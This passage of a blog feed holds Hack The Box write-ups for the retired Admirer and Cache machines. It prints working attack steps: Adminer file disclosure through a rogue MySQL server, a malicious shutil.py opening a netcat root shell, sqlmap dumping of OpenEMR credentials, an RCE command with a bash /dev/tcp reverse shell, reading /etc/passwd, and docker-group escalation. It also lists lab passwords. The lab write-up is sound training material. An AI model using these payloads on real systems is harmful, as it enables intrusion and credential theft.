+<!--kg-card-end: markdown--><ol><li>The <code>dump.sql</code> file contains a dump of a MariaDB database called <strong>admirerdb</strong>. This DB contains only one table - Items - which includes the images and respective metadata that appear on the site, so nothing too exciting;</li><li>The <code>html.tar.gz</code> includes a bunch of files that look like a backup of the current web application. Here are some of the most noteworthy:</li></ol><h3 id="robots-txt">robots.txt</h3><p>The backup version of the robots.txt file disallows <code>/w4ld0s_s3cr3t_d1r</code> instead of <code>/admin-dir</code>.</p><!--kg-card-begin: markdown--><pre><code>User-agent: *
+This folder contains personal stuff, so no one (not even robots!) should see it - waldo
+Disallow: /w4ld0s_s3cr3t_d1r
+</code></pre>
+<!--kg-card-end: markdown--><h3 id="index-php">index.php</h3><p>Contains the code for the main page of the web application, including some credentials for the admirerdb.</p><!--kg-card-begin: markdown--><pre><code>...
+&lt;div id=&quot;main&quot;&gt;
+&lt;?php
+    $servername = &quot;localhost&quot;;
+    $username = &quot;waldo&quot;;
+    $password = &quot;]F7jLHw:*G&gt;UPrTo}~A&quot;d6b&quot;;
+    $dbname = &quot;admirerdb&quot;;
+
+    // Create connection
+    $conn = new mysqli($servername, $username, $password, $dbname);
+    
+    // Check connection
+    if ($conn-&gt;connect_error) {
+        die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);
+    }
+
+    $sql = &quot;SELECT * FROM items&quot;;
+    $result = $conn-&gt;query($sql);
+
+    if ($result-&gt;num_rows &gt; 0) {
+        // output data of each row
+        while($row = $result-&gt;fetch_assoc()) {
+            echo &quot;&lt;article class='thumb'&gt;&quot;;
+            echo &quot;&lt;a href='&quot;.$row[&quot;image_path&quot;].&quot;' class='image'&gt;&lt;img src='&quot;.$row[&quot;thumb_path&quot;].&quot;' alt='' /&gt;&lt;/a&gt;&quot;;
+            echo &quot;&lt;h2&gt;&quot;.$row[&quot;title&quot;].&quot;&lt;/h2&gt;&quot;;
+	    	echo &quot;&lt;p&gt;&quot;.$row[&quot;text&quot;].&quot;&lt;/p&gt;&quot;;
+	    	echo &quot;&lt;/article&gt;&quot;;
+        }
+    } else {
+        echo &quot;0 results&quot;;
+    }
+    $conn-&gt;close();
+?&gt;
+&lt;/div&gt;
+...
+</code></pre>
+<!--kg-card-end: markdown--><h3 id="w4ld0s_s3cr3t_d1r-credentials-txt">w4ld0s_s3cr3t_d1r/credentials.txt</h3><p>There's a credentials.txt file which contains the same credentials as found on <a href="http://admirer.htb/admin-dir/credentials.txt">http://admirer.htb/admin-dir/credentials.txt</a> and one additional cred:</p><!--kg-card-begin: markdown--><pre><code>[Bank Account]
+waldo.11
+Ezy]m27}OREc$
+</code></pre>
+<!--kg-card-end: markdown--><h3 id="utility_scripts-db_admin-php">utility_scripts/db_admin.php</h3><p>There's a small script that handles the connection with the database, which contains some credentials:</p><!--kg-card-begin: markdown--><pre><code>&lt;?php
+    $servername = &quot;localhost&quot;;
+    $username = &quot;waldo&quot;;
+    $password = &quot;Wh3r3_1s_w4ld0?&quot;;
+    
+    // Create connection
+    $conn = new mysqli($servername, $username, $password);
+    
+    // Check connection
+    if ($conn-&gt;connect_error) {
+        die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);
+    }
+    echo &quot;Connected successfully&quot;;
+    
+    // TODO: Finish implementing this or find a better open source alternative
+?&gt;
+
+</code></pre>
+<!--kg-card-end: markdown--><p>So, now we have 2 new credentials:</p><ul><li>one for a bank account (waldo.11);</li><li>one for a mySQL database (waldo);</li></ul><p>Going back to the deployed version of the web application, the <a href="http://admirer.htb/w4ld0s_s3cr3t_d1r/contacts.txt">w4ld0s_s3cr3t_d1r</a> doesn't seem to be available anymore, but the <a href="http://10.10.10.187/utility-scripts/">utility_scripts</a> dir does exist.</p><p>Of all the files on the backup, the <a href="http://10.10.10.187/utility-scripts/admin_tasks.php">admin-tasks page</a> is the most interesting. This page allows any user to check very simple info about the system:</p><figure class="kg-card kg-image-card kg-width-full"><img src="https://inesmartins.github.io//content/images/2020/06/4.png" class="kg-image" alt="HTB Write-up | Admirer"></figure><p>At this point I was a bit stuck but after reviewing all the previous clues I realised I missed something on the db_admin.php file:</p><pre><code>// TODO: Finish implementing this or find a better open source alternative
+</code></pre><p>After some googling, I realised that the "better open source alternative" to database administration is likely the <a href="https://www.adminer.org/">Adminer</a> tool - the name likeness was a dead giveaway. </p><p>And this brings us to the <a href="http://10.10.10.187/utility-scripts/adminer.php">adminer.php</a> page:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login.png" class="kg-image" alt="HTB Write-up | Admirer"></figure><hr><h2 id="exploiting-adminer">Exploiting Adminer</h2><p>After trying (and failing) to login with all of the credentials previously found, I decided to search for Adminer vulnerabilities. </p><p>Turns out <a href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability ">Adminer 4.6.2 is vulnerable to a file disclosure vulnerability</a>.</p><p>So I installed and launched an instance of mySQL server on my machine and then <strong>added a new local user</strong> that can access this mySQL server from the admirer.htb host using the password 'password':</p><!--kg-card-begin: markdown--><pre><code>~ /usr/local/mysql/bin/mysql -u root -p
+Enter password:
+...
+
+mysql&gt; create user 'waldo'@'10.10.10.187' IDENTIFIED WITH mysql_native_password  BY 'password';
+Query OK, 0 rows affected (0.01 sec)
+
+mysql&gt; select user, host from mysql.user;
++------------------+--------------+
+| user             | host         |
++------------------+--------------+
+| waldo            | 10.10.10.187 |
+| mysql.infoschema | localhost    |
+| mysql.session    | localhost    |
+| mysql.sys        | localhost    |
+| root             | localhost    |
++------------------+--------------+
+5 rows in set (0.00 sec)
+</code></pre>
+<!--kg-card-end: markdown--><p>In order to get this to work I had to add some additional configuration to my server ('/etc/my.cnf'):</p><!--kg-card-begin: markdown--><pre><code>[mysqld]
+default_authentication_plugin  =  mysql_native_password
+local-infile                   = 1
+</code></pre>
+<!--kg-card-end: markdown--><p>Note that the <a href="https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_local_infile">local-infile</a> variable should be set to true as to allow us to load data from local files into the DB, which we'll need in a following step.</p><p>Once this is done, we can login as our new user from the Adminer client with password 'password'. Note that the server IP should correspond to the IP where you setup the MySQL server and that you need to specify the port if it's not the default (3306).</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-4.png" class="kg-image" alt="HTB Write-up | Admirer"></figure><p>After logging into the system, we can access the SQL interface and can send commands directly to the machine. </p><p><strong>Our goal is to load local files from the admirer.htb machine to a new DB in our local mySQL server. </strong></p><p>So, first things first, we need to create a valid db with a table that will receive the data. Note that this table should have a field that should support big lines of text content.</p><!--kg-card-begin: markdown--><pre><code>mysql&gt; create database test;
+
+mysql&gt; use test;
+Database changed
+
+mysql&gt; create table tt (line varchar(1000));
+Query OK, 0 rows affected (0.01 sec)
+</code></pre>
+<!--kg-card-end: markdown--><p>Also, you need to grant permission for your user to be able to access that data: </p><!--kg-card-begin: markdown--><pre><code>mysql&gt; grant all privileges on test.tt to 'waldo'@'10.10.10.187';
+Query OK, 0 rows affected (0.04 sec)
+</code></pre>
+<!--kg-card-end: markdown--><p>Going back to our SQL interface, the files most likely to contain valid credentials are index.php and db_admin.php, where we previously found outdated DB credentials.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/query.png" class="kg-image" alt="HTB Write-up | Admirer"></figure><p>To see the results we can either access the data directly on the SQL interface or go to our mySQL server and query the data.</p><!--kg-card-begin: markdown--><pre><code>~ select line from test.tt;
+
+...
+$servername = &quot;localhost&quot;;
+$username = &quot;waldo&quot;;
+$password = &quot;&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;&quot;;
+$dbname = &quot;admirerdb&quot;;
+...
+</code></pre>
+<!--kg-card-end: markdown--><p>Finally, we have credentials for the admirerdb database and as it turns out waldo's SSH credentials:</p><!--kg-card-begin: markdown--><pre><code>ssh waldo@10.10.10.187
+waldo@10.10.10.187's password:
+Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Mon Jun  8 21:25:38 2020 from 10.10.14.95
+waldo@admirer:~$ 
+</code></pre>
+<!--kg-card-end: markdown--><h3 id="useful-resources">Useful Resources</h3><ul><li><a href="https://www.dev2qa.com/how-to-use-mysql-on-mac/">https://www.dev2qa.com/how-to-use-mysql-on-mac/</a></li><li><a href="https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py">https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</a></li><li><a href="https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html">https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html</a></li><li><a href="https://stackoverflow.com/questions/14779104/how-to-allow-remote-connection-to-mysql">https://stackoverflow.com/questions/14779104/how-to-allow-remote-connection-to-mysql</a></li></ul><hr><h2 id="privilege-escalation">Privilege Escalation</h2><p>Now authenticated as <code>waldo</code>, we started by running <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a>, which helped us find some interesting stuff:</p><!--kg-card-begin: markdown--><pre><code>[+] Readable files belonging to root and readable by me but not world readable
+-rwxr----- 1 root admins 198 Dec  2  2019 /opt/scripts/backup.py
+</code></pre>
+<!--kg-card-end: markdown--><p>On the <code>/opt/scripts/</code> directory we find the <code>admin_tasks</code> bash script which is called by the administrative interface we previously saw. </p><p>At first glance there wasn't any obvious way to exploit this script but, as you can see below, there is a "Backup web data" option which executes the <code>backup.py</code> script as root.</p><!--kg-card-begin: markdown--><pre><code>...
+backup_web()
+{
+    if [ &quot;$EUID&quot; -eq 0 ]
+    then
+        echo &quot;Running backup script in the background, it might take a while...&quot;
+        /opt/scripts/backup.py &amp;
+    else
+        echo &quot;Insufficient privileges to perform the selected operation.&quot;
+    fi
+}
+...
+</code></pre>
+<!--kg-card-end: markdown--><p>The <code>backup.py</code> file, on the other hand, imports the <code>make_archive</code> binary from <code>shutil</code>, which we might be able to exploit by changing the path in which the Python script is executed.</p><!--kg-card-begin: markdown--><pre><code>!/usr/bin/python3
+
+from shutil import make_archive
+
+src = '/var/www/html/'
+
+old ftp directory, not used anymore
+dst = '/srv/ftp/html'
+
+dst = '/var/backups/html'
+
+make_archive(dst, 'gztar', src)
+</code></pre>
+<!--kg-card-end: markdown--><p>So, we need to:</p><ul><li>change the <strong>Python path</strong> to start with a directory that we control, e.g.: /home/waldo/.abc/;</li><li>create a <strong>shutil.py</strong> file inside /home/waldo/.abc/;</li><li>add a <strong>make_archive</strong> function to shutil.py that uses the same signature (3 fields) but instead of archiving the web content returns a shell as root;</li></ul><p>Let's start with our mock <code>shutil.py</code>:</p><!--kg-card-begin: markdown--><pre><code>waldo@admirer:~$ nano /home/waldo/.abc/shutil.py
+
+import os
+
+def make_archive(a, b, c):
+    os.system(&quot;nc [attacker_ip] [attacker_port] -e '/bin/sh'&quot;)
+    
+waldo@admirer:~$ chmod +x /home/waldo/.abc/shutil.py
+</code></pre>
+<!--kg-card-end: markdown--><p>Don't forget to create a listener on the port you specify above:</p><!--kg-card-begin: markdown--><p><code>nc -l [PORT]</code></p>
+<!--kg-card-end: markdown--><p>Now, all we need to do is change the python path on the call for the admin_tasks script:</p><!--kg-card-begin: markdown--><pre><code>waldo@admirer:~$ sudo PYTHONPATH=/home/waldo/.abc/ /opt/scripts/admin_tasks.sh
+
+[sudo] password for waldo: &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 6
+Running backup script in the background, it might take a while...
+</code></pre>
+<!--kg-card-end: markdown--><p>And we receive a shell as root which allows us to print the root flag!</p><p>Hope you enjoyed it :)</p><hr>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Cache]]></title><description><![CDATA[Write-up for Cache, a retired HTB machine.]]></description><link>https://inesmartins.github.io//htb-write-up-cache/</link><guid isPermaLink="false">5ede7316b6ef324dc7275f74</guid><category><![CDATA[htb]]></category><category><![CDATA[linux]]></category><category><![CDATA[cache]]></category><category><![CDATA[memcached]]></category><category><![CDATA[privesc]]></category><category><![CDATA[docker]]></category><category><![CDATA[openemr]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 22 Oct 2020 08:51:40 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/10/cache.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/10/cache.png" alt="HTB Write-up | Cache"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/251">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>We start with our usual scanning which finds only an instance of <code>OpenSSH</code> running on port 22 and an <code>Apache</code> server running on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ sudo nmap -sV -sC -A -T4 cache.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 18:21 WEST
+Nmap scan report for cache.htb (10.10.10.188)
+Host is up (0.042s latency).
+Not shown: 998 closed ports
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
+|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
+|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Cache
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</code></pre>
+<!--kg-card-end: markdown--><p>The website hosted on <code>cache.htb</code> is very simple: there are only a couple of HTML pages with some text about hacking.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/index.png" class="kg-image" alt="HTB Write-up | Cache"></figure><p>There's also a very simple <a href="http://cache.htb/login.html">Login page</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-2.png" class="kg-image" alt="HTB Write-up | Cache"></figure><p>The credentials for this authentication form are hardcoded on a <a href="http://cache.htb/jquery/functionality.js">JS file</a>:</p><!--kg-card-begin: markdown--><pre><code>user: ash
+password: H@v3_fun
+</code></pre>
+<!--kg-card-end: markdown--><p>Using these credentials on the form we're redirected to the <a href="http://cache.htb/net.html">Net page</a>, which doesn't seem to have anything of relevance.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/net.png" class="kg-image" alt="HTB Write-up | Cache"></figure><p>The <a href="http://cache.htb/author.html">Author page</a>, on the other hand, seems to have some interesting information:</p><pre><code class="language-html">&lt;div class="card"&gt;
+  &lt;img src="logo1.jpg" alt="John" style="width:100%"&gt;
+  &lt;h1&gt;ASH&lt;/h1&gt;
+  &lt;p class="title"&gt;CEO &amp; Founder, CACHE&lt;/p&gt;
+  &lt;a href="http://cache.htb"&gt;cache.htb&lt;/a&gt;
+  &lt;h3&gt;&lt;font color="Grey"&gt;ASH is a Security Researcher (Threat Research Labs), Security Engineer. Hacker, Penetration Tester and Security blogger. He is Editor-in-Chief, Author &amp; Creator of Cache. Check out his other projects like Cache:&lt;p&gt; HMS(Hospital Management System)
+&lt;/font&gt;&lt;/h3&gt; </code></pre><p>So, a couple of interesting things:</p><ul><li>the CEO and Founder of CACHE is someone named ASH (also maybe John according to the alt tag);</li><li>ASH is also the creator of another project called HMS;</li></ul><p>I was certain that HMS was an important clue, but wasn't completely sure how to access it. That is until I realised that it's possible to <strong>host multiple domains on the same Apache server </strong>which are accessible only when you navigate to the correct URL. So, in order to display this other website, all we have to do is change our <code>/etc/hosts</code> configuration:</p><!--kg-card-begin: markdown--><pre><code>10.10.10.188 hms.htb
+</code></pre>
+<!--kg-card-end: markdown--><hr><h2 id="exploiting-openemr-vulnerabilities">Exploiting OpenEMR Vulnerabilities</h2><p>When we access <a href="http://hms.htb/">hms.htb</a> we're redirected to a <a href="http://hms.htb/interface/login/login.php?site=default">login page</a> for <a href="https://www.open-emr.org/">OpenEMR</a>, which is an "open source electronic health records and medical practice management solution".</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-3.png" class="kg-image" alt="HTB Write-up | Cache"></figure><p>Turns out OpenEMR has a lot of well-known vulnerabilities, which are very thoroughly detailed <a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">here</a>.</p><p>As indicated on these docs, we can check the <a href="http://hms.htb/admin.php">admin.php</a> file for the exact version of the application:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/vulns.png" class="kg-image" alt="HTB Write-up | Cache"></figure><p>This version is vulnerable to multiple SQL Injection vulnerabilities. There's actually a very good <a href="https://www.youtube.com/watch?time_continue=115&amp;v=DJSQ8Pk_7hc&amp;feature=emb_logo">video tutorial</a> for this exploit, but in very simple terms it works as follows:</p><ol><li>capture the GET request to a <a href="http://hms.htb/portal/add_edit_event_user.php">portal page</a> with <a href="https://portswigger.net/burp">Burp</a> or any other proxy;</li><li>copy that request to a file and then add a parameter (?eid=1) to the URL:</li></ol><!--kg-card-begin: markdown--><pre><code>~ sudo nano openemr.req
+
+GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1
+Host: hms.htb
+Cache-Control: max-age=0
+DNT: 1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,pt-PT;q=0.8,pt;q=0.7
+Cookie: OpenEMR=ektggh73sf93fg6kg9ctif9km6; PHPSESSID=mff3bosse1qitlik842hl4ud4f
+Connection: close
+</code></pre>
+<!--kg-card-end: markdown--><p>3. use <a href="http://sqlmap.org/">sqlmap</a> to exploit the aforementioned SQL injection vulnerabilities, starting with the enumeration of the available databases:</p><!--kg-card-begin: markdown--><pre><code>~ sqlmap -r openemr.req --threads=10 --dbs
+
+available databases [2]:
+[*] information_schema
+[*] openemr
+</code></pre>
+<!--kg-card-end: markdown--><p>4. once we have the database name, dump the contents of the <strong>users_secure</strong> table, which holds user info including passwords:</p><!--kg-card-begin: markdown--><pre><code>~ sqlmap -r openemr.req --threads=10 -D openemr -T users_secure --dump
+</code></pre>
+<!--kg-card-end: markdown--><p>And voilà!<br>The users_secure table has only one user - <strong>openemr_admin</strong> - and now we know their hashed password, which we'll crack using john:</p><!--kg-card-begin: markdown--><pre><code>$ john -w=rockyou.txt hash.txt 
+</code></pre>
+<!--kg-card-end: markdown--><p>Now that we have a valid user/password combination, we can use <a href="https://www.exploit-db.com/exploits/45161">this script</a> to help us get the RCE (it took a bit of tweaking to get the script to work, since the base64 encoding was not working properly):</p><!--kg-card-begin: markdown--><pre><code>~ python3 openemr_rce.py http://hms.htb -u openemr_admin -p xxxxxx -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.43/4444 0&gt;&amp;1&quot;
+</code></pre>
+<!--kg-card-end: markdown--><hr><h2 id="getting-user">Getting user</h2><p>As always, we check the <code>/etc/passwd</code> file to check the system's users:</p><!--kg-card-begin: markdown--><pre><code>www-data@cache:/$ cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+ash:x:1000:1000:ash:/home/ash:/bin/bash
+luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
+memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
+mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre>
+<!--kg-card-end: markdown--><p>There are 2 interesting users: <strong>ash</strong> and <strong>luffy</strong>:</p><ul><li>ash we already know - they're the CEO of both Cache and HMS. </li><li>luffy, however, means nothing to us at this point (but this is the name of a <a href="https://en.wikipedia.org/wiki/One_Piece">OnePiece</a> character, which combined with the image on the <a href="http://10.10.10.188/net.html">Net page</a> page might be a little clue).</li></ul><hr><h3 id="using-su">Using su</h3><p>We now have a couple of credentials that we want to test for both ash and luffy, however when we try to use <code>su</code>, we get the following error message:</p><!--kg-card-begin: markdown--><pre><code>www-data@cache:/var/www/hms.htb/public_html$ su -u ash
+su -u ash
+su: must be run from a terminal
+</code></pre>
+<!--kg-card-end: markdown--><p>After some Googling I realised that this means this machine is running inside a<a href="https://www.docker.com/"> </a>container. <a href="https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal">This StackOverflow answer</a> helped me go around it by using a <a href="https://netsec.ws/?p=337">TTY shell</a>:</p><!--kg-card-begin: markdown--><pre><code>www-data@cache:$ echo &quot;import pty; pty.spawn('/bin/bash')&quot; &gt; /tmp/abc.py
+www-data@cache:$ python3 /tmp/abc.py
+www-data@cache:$ rm /tmp/abc.py
+www-data@cache:$ su - ash
+Password: H@v3_fun
+ash@cache:~$ 
+</code></pre>
+<!--kg-card-end: markdown--><hr><h2 id="becoming-luffy">Becoming luffy</h2><p>From our initial enumeration we know that luffy is a member of the <code>docker</code> group, so it's likely that we first need to become luffy before being able to escalate to root.</p><p>So, we start by checking all the services running on the machine:</p><!--kg-card-begin: markdown--><pre><code>ash@cache:~/$ service --status-all
+
+ [ - ]  acpid
+ [ + ]  apache-htcacheclean
+ [ + ]  apache2
+ [ + ]  apparmor
+ [ + ]  apport
+ [ + ]  atd
+ [ - ]  console-setup.sh
+ [ + ]  cron
+ [ - ]  cryptdisks
+ [ - ]  cryptdisks-early
+ [ + ]  dbus
+ [ + ]  docker
+ [ + ]  ebtables
+ [ + ]  grub-common
+ [ - ]  hwclock.sh
+ [ + ]  irqbalance
+ [ + ]  iscsid
+ [ - ]  keyboard-setup.sh
+ [ + ]  kmod
+ [ - ]  lvm2
+ [ + ]  lvm2-lvmetad
+ [ + ]  lvm2-lvmpolld
+ [ + ]  lxcfs
+ [ - ]  lxd
+ [ - ]  mdadm
+ [ - ]  mdadm-waitidle
+ [ + ]  memcached
+ [ + ]  mysql
+ [ - ]  open-iscsi
+ [ + ]  open-vm-tools
+ [ - ]  plymouth
+ [ - ]  plymouth-log
+ [ + ]  procps
+ [ - ]  rsync
+ [ + ]  rsyslog
+ [ - ]  screen-cleanup
+ [ + ]  ssh
+ [ + ]  udev
+ [ + ]  ufw
+ [ + ]  unattended-upgrades
+ [ - ]  uuidd
+</code></pre>
+<!--kg-card-end: markdown--><p>Because of the name of the machine I decided to start by checking out the process in which <a href="https://memcached.org/">memcached</a> is running:</p><!--kg-card-begin: markdown--><pre><code>ash@cache:~$ ps aux | grep memcached
+
+memcache   961  0.0  0.0 425792  4032 ?        Ssl  14:07   0:02 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
+ash       7525  0.0  0.0 416308  2480 pts/5    Sl+  16:25   0:00 memcached
+ash       8590  0.0  0.0  13136  1048 pts/6    S+   16:27   0:00 grep --color=auto memcached
+</code></pre>
+<!--kg-card-end: markdown--><blockquote>Memcached is an in-memory key-value store for small chunks of arbitrary data (strings, objects) from results of database calls, API calls, or page rendering. (...) [It's] intended for use in speeding up dynamic web applications by alleviating database load. [<a href="https://memcached.org/">Source</a>]</blockquote><p>Now that we know the port this service is using, let's see if there's anything useful cached on the server:</p><!--kg-card-begin: markdown--><pre><code>ash@cache:~$ nc 127.0.0.1 11211
+nc 127.0.0.1 11211
+stats items
+stats items
+STAT items:1:number 5
+STAT items:1:number_hot 0
+STAT items:1:number_warm 0
+STAT items:1:number_cold 5
+STAT items:1:age_hot 0
+STAT items:1:age_warm 0
+STAT items:1:age 20
+STAT items:1:evicted 0
+STAT items:1:evicted_nonzero 0
+STAT items:1:evicted_time 0
+STAT items:1:outofmemory 0
+STAT items:1:tailrepairs 0
+STAT items:1:reclaimed 0
+STAT items:1:expired_unfetched 0
+STAT items:1:evicted_unfetched 0
+STAT items:1:evicted_active 0
+STAT items:1:crawler_reclaimed 0
+STAT items:1:crawler_items_checked 72
+STAT items:1:lrutail_reflocked 0
+STAT items:1:moves_to_cold 895
+STAT items:1:moves_to_warm 0
+STAT items:1:moves_within_lru 0
+STAT items:1:direct_reclaims 0
+STAT items:1:hits_to_hot 0
+STAT items:1:hits_to_warm 0
+STAT items:1:hits_to_cold 2
+STAT items:1:hits_to_temp 0
+END
+</code></pre>
+<!--kg-card-end: markdown--><p>We know there's only 1 item, let's see what it contains:</p><!--kg-card-begin: markdown--><pre><code>stats cachedump 1 1000
+ITEM link [21 b; 0 s]
+ITEM user [5 b; 0 s]
+ITEM passwd [9 b; 0 s]
+ITEM file [7 b; 0 s]
+ITEM account [9 b; 0 s]
+END
+```</code></pre>
+<!--kg-card-end: markdown--><p>Seems very interesting, let's print the values:</p><!--kg-card-begin: markdown--><pre><code>get user
+get user
+VALUE user 0 5
+luffy
+END
+
+get passwd
+get passwd
+VALUE passwd 0 9
+0n3_p1ec3
+END
+</code></pre>
+<!--kg-card-end: markdown--><p>And there we go! We're now luffy!</p><hr><h2 id="getting-root">Getting root</h2><p>Knowing that luffy is a part of the docker group we only need a bit of googling to find a potential priv esc path:</p><blockquote>The problem arises when the docker group is assigned to the host user. Since docker is running as root with SGID, an unauthorised person who has access to the host user (with user privileges) can easily escalate privileges by mounting the host volume to one of the containers; granting the attacker full access to the filesystem. [<a href="https://root4loot.com/post/docker-privilege-escalation/">Source</a>]</blockquote><p>So, as specified on the article, we start by listing the available containers:</p><!--kg-card-begin: markdown--><pre><code>luffy@cache:~$ docker container ps
+</code></pre>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><table>
+<thead>
+<tr>
+<th>CONTAINER ID</th>
+<th>IMAGE</th>
+<th>COMMAND</th>
+<th>CREATED</th>
+<th>STATUS</th>
+<th>PORTS</th>
+<th>NAMES</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>9c0e13e441d3</td>
+<td>ubuntu</td>
+<td>&quot;chroot /mnt sh&quot;</td>
+<td>36 minutes ago</td>
+<td>Up 36 minutes</td>
+<td></td>
+<td>relaxed_ishizaka</td>
+</tr>
+<tr>
+<td>be4e9f712cb2</td>
+<td>ubuntu</td>
+<td>&quot;chroot /mnt sh&quot;</td>
+<td>4 hours ago</td>
+<td>Up 4 hours</td>
+<td></td>
+<td>heuristic_pasteur</td>
+</tr>
+</tbody>
+</table>
+<!--kg-card-end: markdown--><p>There's only 1 image we can run: <strong>ubuntu</strong>. Now we can mount our machine's entire filesystem on a new container (by specifying the <code>-v</code> argument) and then spawn a TTY to access it.</p><!--kg-card-begin: markdown--><pre><code>luffy@cache:~$ docker run -v /:/mnt/root -ti ubuntu
+</code></pre>
+<!--kg-card-end: markdown--><p>Since we're root, we can print the root flag from its relative path to the mount point.</p><!--kg-card-begin: markdown--><pre><code>root@a5d39b0a924a:/# cat /mnt/root/root/root.txtcat 
+</code></pre>
